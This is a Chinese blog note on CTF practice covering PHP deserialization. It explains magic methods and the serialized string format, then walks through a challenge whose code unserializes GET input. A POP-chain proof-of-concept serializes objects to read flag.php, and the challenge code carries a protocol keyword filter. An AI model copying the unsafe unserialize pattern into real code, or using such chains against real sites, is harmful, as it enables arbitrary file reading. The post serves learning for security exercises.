---
author: "Yiming Shen"
date: 2022-06-11
lastmod: 2022-06-11
title: "PHP 反序列化"
tags: [
    "CTF",
    "PHP",
    "Web",
    "Note",
]
categories: [
    "Notes",
     "CTF",
]
showtoc: true
math: true
typora-root-url: ..\..\..\..\static\
---

## 基础知识

1. 常见PHP魔术函数

``` php
__construct() //当一个对象创建时被调用

__destruct() //当一个对象销毁时被调用

__wakeup() //使用unserialize时触发

__sleep() //使用serialize时触发

__destruct() //对象被销毁时触发

__call() //在对象上下文中调用不可访问的方法时触发

__get() //用于从不可访问的属性读取数据

__set() //用于将数据写入不可访问的属性

__toString() //把类当作字符串使用时触发

__invoke() //当脚本尝试将对象调用为函数时触发
```

> 审POP链的过程，需要熟练掌握魔术函数。

2. 掌握面向对象概念以及PHP中的类与对象

## 序列化与反序列化

> **序列化**：把对象转换为字节序列的过程，便于存储或传输。
>
> **反序列化**：把字节序列恢复为对象的过程。

### 漏洞可能出现的位置

1.解析认证token、session的位置

2.将序列化的对象存储到磁盘文件或存入数据库后反序列化时的位置，如读取json文件，xml文件等

3.将对象序列化后在网络中传输，如传输json数据，xml数据等

4.参数传递给程序

5.使用RMI协议，被广泛使用的RMI协议完全基于序列化

6.使用了不安全的框架或基础类库，如JMX 、Fastjson和Jackson等

7.定义协议用来接收与发送原始的java对象

### 原理

在程序将字节序列恢复为对象的过程中，信任了可能被第三方篡改过的字节序列（内容可控），在将其反序列化的过程中，通过触发魔术方法（Python、PHP）或反射机制（JAVA），实现传入任意参数调用方法（POP链利用）。

### 序列化后的对象字符串

```php
O:1:"A":1:{s:7:"%00A%00name";s:6:"As1def";}

// O代表这是一个对象，第一个1代表对象名称的长度，第二个1代表成员个数。
// 大括号中分别是：属性名类型、长度、名称;值类型、长度、值。
// s代表string类型
// 另外还有b=>bool  i=>int  d=>double  a=>array r=>对象引用 R=> 指针引用 N=>NULL;

// 有%00是加上protected或private关键字限定的类变量，这种类变量在进行反序列化操作时需要对其进行URL编码，否则存在%0A错误解析成截断的可能性。
```

## POP链构造

> POP（Property-Oriented Programing）面向属性编程，用于上层语言构造特定调用链的方法，从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构造一组连续的调用链，达到攻击者恶意利用的目的。

即构造一条完整的调用链，通过控制对象的属性实现控制程序的执行流程，达到利用无害代码实现有害操作的目的。

### 实例

```php
<?php
//flag is in flag.php
error_reporting(1);
class Read {
    public $var;
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
    public function __invoke(){
        $content = $this->file_get($this->var);
        echo $content;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file='index.php')
    {
        $this->source = $file;
        echo $this->source.'Welcome'."<br>";
    }
    public function __toString()
    {
        return $this->str['str']->source;
    }

    public function _show()
    {
        if(preg_match('/gopher|http|ftp|https|dict|\.\.|flag|file/i',$this->source)) {
            die('hacker');
        } else {
            highlight_file($this->source); 
        }

    }

    public function __wakeup()
    {
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test
{
    public $p;
    public function __construct()
    {
        $this->p = array();
    }

    public function __get($key)
    {
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['hello']))
{
    unserialize($_GET['hello']);
}
else
{
    $show = new Show('pop3.php');
    $show->_show();
}
```

#### 分析思路

- 先找到能利用的点：Read.file_get里的file_get_contents可以获取文件，在作为对象函数执行（`__invoke`）时可读取文件。
- 可控的是`get`传入的hello参数，将hello值反序列化，此时会调用`__wakeup`方法，只有Show类中存在该方法。`\_\_wakeup`方法中会对`$this->source`进行正则匹配，此时会将`source`的内容当作字符串处理，即调用`__toString()`方法。
- `__toString`方法中读取了`$this->str['str']->source`，如果`str['str']`对象中没有`source`这个变量呢？此时就会调用`__get`魔术方法（如果该对象存在这个方法的话）。
- 观察程序，发现只有Test类有`__get`方法，用Test类继续构造POP链，会调用`$this->p`变量，并将`$this->p`作为函数执行，此时就来到了我们找到的利用点——Read类中的`__invoke`魔术方法！

如此，我们构造好了一条POP链：

`$_GET['hello']->Show.__wakeup->Show.__toString->Test.__get->Read.__invoke->Read.file_get->读取任意文件`

得到POC

```php
<?php
    class Read{
        public $var = "flag.php";
    }
    class Show{
        public $source;
        public $str;
    }

    class Test{
        public $p;
    }

    $read = new Read();
    $show = new Show();
    $test = new Test();

    $show->str['str']=$test; 
    $test->p=$read;
    echo serialize($show);
    echo '
    ';
    $show->source=$show; //存疑，这个地方照葫芦画瓢，但不明意思
    echo serialize($show);
?>
```

#### 总结

1. 先观察是否存在利用点
   1. 可执行命令、文件包含的敏感函数
   2. 参数可控的变量、入口
2. 注意所有魔术方法
3. 将魔术方法执行顺序连成一条链
4. 确定对象调用顺序，填入对象变量参数，构造POP链







## 参考

1. [PHP反序列化和POP链构造 - As1def's Blog](https://as1def.github.io/2020/10/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CPOP%E9%93%BE%E6%9E%84%E9%80%A0/)
2. [一题教你学会构造PHP反序列化POP链](https://www.freebuf.com/articles/web/247930.html)

